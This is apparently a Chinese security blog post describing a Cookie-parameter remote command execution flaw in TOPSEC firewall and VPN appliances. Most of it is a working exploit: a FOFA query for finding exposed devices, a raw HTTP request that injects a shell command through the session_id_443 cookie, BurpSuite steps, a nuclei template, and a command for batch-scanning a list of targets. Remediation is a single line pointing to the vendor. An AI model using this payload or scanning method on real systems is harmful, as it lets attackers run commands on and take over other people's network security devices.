#  天X信TOPSEC Cookie 远程命令执行漏洞   
不秃头的安全  不秃头的安全   2024-01-07 10:20  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/DicRqXXQJ6fVY28ybNsfr9Riaxc0y93IXwic9Kxv0LpFzdUIFbchGWMicCV1I4OwLZqAteIpgyibgKe5XuBGostfDhw/640?wx_fmt=png&from=appmsg "")  
  
**天X信TOPSEC Cookie 远程命令执行漏洞**  
  
  
  
前言：本文中涉及到的相关技术或工具仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担，如有侵权请联系。  
  
由于微信公众号推送机制改变了，快来  
星标不再迷路，谢谢大家！  
  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/DicRqXXQJ6fVY28ybNsfr9Riaxc0y93IXw76WJ8b9VW6YdH36D6T8J0bA0aqmn9PjlvcTQXL6s2ia8sHib601iaOSWg/640?wx_fmt=png&from=appmsg "")  
  
********  
**漏洞详情：******  
  
天融信TOPSEC解决方案包括综合管理系统，各类安全产品如防火墙、VPN、安全网关、宽带管理、入侵检测、内容过滤、个人安全套件以及综合安全审计系统等多种安全功能。该系统Cookie参数存在RCE漏洞，会导致服务器失陷。  
  
  
****  
**影响范围**  
  
****  
天融信TOPSEC  
  
  
**资产测绘**  
  
****```
title="Web User Login" && body="/cgi/maincgi.cgi?Url=VerifyCode"
```  
  
  
  
**漏洞利用**  
```
payload：

GET /cgi/maincgi.cgi?Url=aa HTTP/1.1
Host: X
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="104"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Cookie: session_id_443=1|echo 'nvgjngfszfzah1' > /www/htdocs/site/image/ecisas.txt;
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```  
  
  
**使用方法：**  
  
****1、使用浏览器访问目标系统，并使用BurpSuite进行拦截抓包；  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/DicRqXXQJ6fVY28ybNsfr9Riaxc0y93IXwtJpVdPBOpXXauPynyxOiacVjsBvvgjxUTCDs829NHbZcib5ulIOjX7SA/640?wx_fmt=png&from=appmsg "")  
  
2、将BurpSuite拦截的GET请求包添加所需payload中cookie，并放包  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/DicRqXXQJ6fVY28ybNsfr9Riaxc0y93IXw3S0hKFKspEgaYtbdgM5E5JHlbXbFLyjxstcZ3YwpgzVNu8ObBWRPUg/640?wx_fmt=png&from=appmsg "")  
  
3、请求结果状态码返回为200访问设置的回显地址  
```
http://0.0.0.0/site/image/123123.txt
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/DicRqXXQJ6fVY28ybNsfr9Riaxc0y93IXwRTVGQaEuR6Lj9PbibXnlXRBjIewkR5BXcrphvia17rN33HLABLHAVd6w/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
  
****  
  
**漏洞修复建议**  
  
查看官网厂商信息  
  
  
  
  
  
  
  
  
nuclei poc  
```
info:
  name: 天融信TOPSEC Cookie 远程命令执行漏洞
  author: fgz
  severity: critical
  description: 天融信TOPSEC解决方案包括综合管理系统，各类安全产品如防火墙、VPN、安全网关、宽带管理、入侵检测、内容过滤、个人安全套件以及综合安全审计系统等多种安全功能。该系统Cookie参数存在RCE漏洞，会导致服务器失陷。
  metadata:
    max-request: 1
    fofa-query: title="Web User Login" && body="/cgi/maincgi.cgi?Url=VerifyCode"
    verified: true
variables:
  file_name: "{{to_lower(rand_text_alpha(6))}}"
  file_content: "{{to_lower(rand_text_alpha(15))}}"
requests:
  - raw:
      - |+
        GET /cgi/maincgi.cgi?Url=aa HTTP/1.1
        Host: {{Hostname}}
        Cookie: session_id_443=1|echo '{{file_content}}' > /www/htdocs/site/image/{{file_name}}.txt;
        User-Agent: Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36

      - |
        GET /site/image/{{file_name}}.txt HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36

    matchers:
      - type: dsl
        dsl:
          - "status_code_1 == 200 && status_code_2 == 200 && contains(body_2, '{{file_content}}')"
```  
  
批量使用方法  
```
nuclei -t topsec-maincgi-cookie-rce.yaml -l url.txt
```  
  
  
  
  
  
感谢各位大佬们关注-不秃头的安全，后续会坚持更新渗透漏洞思路分享、安全测试、好用工具分享以及挖掘SRC思路等文章，同时会组织不定期抽奖，希望能得到各位的关注与支持。  
  
  
  
  
